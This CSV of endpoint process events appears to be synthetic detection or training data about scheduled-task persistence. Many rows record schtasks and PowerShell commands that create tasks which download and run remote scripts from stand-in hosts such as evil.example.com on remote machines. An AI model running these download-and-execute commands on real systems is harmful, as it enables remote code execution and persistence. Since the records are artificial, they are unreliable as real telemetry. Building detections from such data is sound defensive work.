Timestamp,DeviceName,AccountName,FileName,InitiatingProcessFileName,ProcessVersionInforOriginalFileName,ProcessCommandLine,ReportId,DeviceId
2025-10-22T06:35:02.851619,FIN-WS02,admin,schtasks.exe,cmd.exe,powershell.exe,"schtasks.exe /create /tn ""BackupJob"" /tr ""powershell.exe -Command \""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')\"""" /s 10.10.10.10",9361,device-798
2025-10-22T11:02:02.851652,FIN-WS02,admin,powershell.exe,explorer.exe,powershell.exe,"schtasks.exe /change /tn ""SystemCleanup"" /tr ""powershell.exe -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example.com/run.ps1')\"""" /s 172.16.1.5",7217,device-120
2025-10-22T05:07:02.851660,WIN-SRV02,svc_backup,schtasks.exe,explorer.exe,powershell.exe,"schtasks.exe /create /tn ""BackupJob"" /tr ""powershell.exe -Command \""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')\"""" /s 10.10.10.10",3865,device-836
2025-10-22T10:06:02.851670,HR-WS01,john.doe,powershell.exe,explorer.exe,powershell.exe,"powershell.exe -Command ""New-ScheduledTask -Action (New-ScheduledTaskAction -Execute calc.exe)"" /s 10.0.0.50",6289,device-203
2025-10-22T04:02:02.851677,FIN-WS02,john.doe,schtasks.exe,cmd.exe,schtasks.exe,"schtasks.exe /change /tn ""SystemCleanup"" /tr ""powershell.exe -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example.com/run.ps1')\"""" /s 172.16.1.5",9002,device-121
2025-10-22T04:05:02.851683,FIN-WS02,admin,powershell.exe,services.exe,powershell.exe,"schtasks.exe /change /tn ""SystemCleanup"" /tr ""powershell.exe -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example.com/run.ps1')\"""" /s 172.16.1.5",1536,device-816
2025-10-22T09:01:02.851689,WIN-SRV01,admin,powershell.exe,explorer.exe,schtasks.exe,"schtasks.exe /change /tn ""SystemCleanup"" /tr ""powershell.exe -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example.com/run.ps1')\"""" /s 172.16.1.5",2654,device-539
2025-10-22T07:37:02.851696,WIN-SRV01,svc_backup,schtasks.exe,explorer.exe,schtasks.exe,"powershell.exe -Command ""Register-ScheduledTask -TaskName AutoUpdater -Action (New-ScheduledTaskAction -Execute notepad.exe) -Trigger (New-ScheduledTaskTrigger -AtStartup)"" /s 192.168.1.25",2030,device-249
2025-10-22T10:27:02.851704,HR-WS01,admin,powershell.exe,explorer.exe,schtasks.exe,"schtasks.exe /change /tn ""SystemCleanup"" /tr ""powershell.exe -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example.com/run.ps1')\"""" /s 172.16.1.5",1535,device-257
2025-10-22T09:09:02.851710,HR-WS01,jane.smith,schtasks.exe,services.exe,powershell.exe,"schtasks.exe /create /tn ""BackupJob"" /tr ""powershell.exe -Command \""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')\"""" /s 10.10.10.10",4723,device-656
2025-10-22T08:51:02.851717,HR-WS01,jane.smith,schtasks.exe,services.exe,powershell.exe,"powershell.exe -Command ""Register-ScheduledTask -TaskName AutoUpdater -Action (New-ScheduledTaskAction -Execute notepad.exe) -Trigger (New-ScheduledTaskTrigger -AtStartup)"" /s 192.168.1.25",2294,device-773
2025-10-22T11:44:02.851722,WIN-SRV01,svc_backup,powershell.exe,explorer.exe,schtasks.exe,"powershell.exe -Command ""New-ScheduledTask -Action (New-ScheduledTaskAction -Execute calc.exe)"" /s 10.0.0.50",6249,device-560
2025-10-22T05:20:02.851729,WIN-SRV02,svc_backup,powershell.exe,cmd.exe,schtasks.exe,"schtasks.exe /create /tn ""BackupJob"" /tr ""powershell.exe -Command \""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')\"""" /s 10.10.10.10",9061,device-880
2025-10-22T13:15:02.851735,FIN-WS02,svc_backup,powershell.exe,services.exe,powershell.exe,"powershell.exe -Command ""Register-ScheduledTask -TaskName AutoUpdater -Action (New-ScheduledTaskAction -Execute notepad.exe) -Trigger (New-ScheduledTaskTrigger -AtStartup)"" /s 192.168.1.25",5278,device-160
2025-10-22T08:00:02.851741,FIN-WS02,admin,powershell.exe,cmd.exe,schtasks.exe,"powershell.exe -Command ""Register-ScheduledTask -TaskName AutoUpdater -Action (New-ScheduledTaskAction -Execute notepad.exe) -Trigger (New-ScheduledTaskTrigger -AtStartup)"" /s 192.168.1.25",7886,device-205
2025-10-22T12:03:02.851747,WIN-SRV01,jane.smith,powershell.exe,cmd.exe,powershell.exe,"powershell.exe -Command ""Register-ScheduledTask -TaskName AutoUpdater -Action (New-ScheduledTaskAction -Execute notepad.exe) -Trigger (New-ScheduledTaskTrigger -AtStartup)"" /s 192.168.1.25",3611,device-233
2025-10-22T08:57:02.851753,FIN-WS02,svc_backup,schtasks.exe,explorer.exe,powershell.exe,"powershell.exe -Command ""Register-ScheduledTask -TaskName AutoUpdater -Action (New-ScheduledTaskAction -Execute notepad.exe) -Trigger (New-ScheduledTaskTrigger -AtStartup)"" /s 192.168.1.25",4462,device-831
2025-10-22T09:41:02.851758,WIN-SRV01,admin,schtasks.exe,services.exe,schtasks.exe,"schtasks.exe /create /tn ""BackupJob"" /tr ""powershell.exe -Command \""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')\"""" /s 10.10.10.10",7583,device-298
2025-10-22T06:21:02.851764,FIN-WS02,john.doe,powershell.exe,services.exe,powershell.exe,"schtasks.exe /change /tn ""SystemCleanup"" /tr ""powershell.exe -Command \""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example.com/run.ps1')\"""" /s 172.16.1.5",7331,device-423
2025-10-22T12:29:02.851771,WIN-SRV01,svc_backup,powershell.exe,cmd.exe,schtasks.exe,"schtasks.exe /create /tn ""BackupJob"" /tr ""powershell.exe -Command \""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')\"""" /s 10.10.10.10",3990,device-594
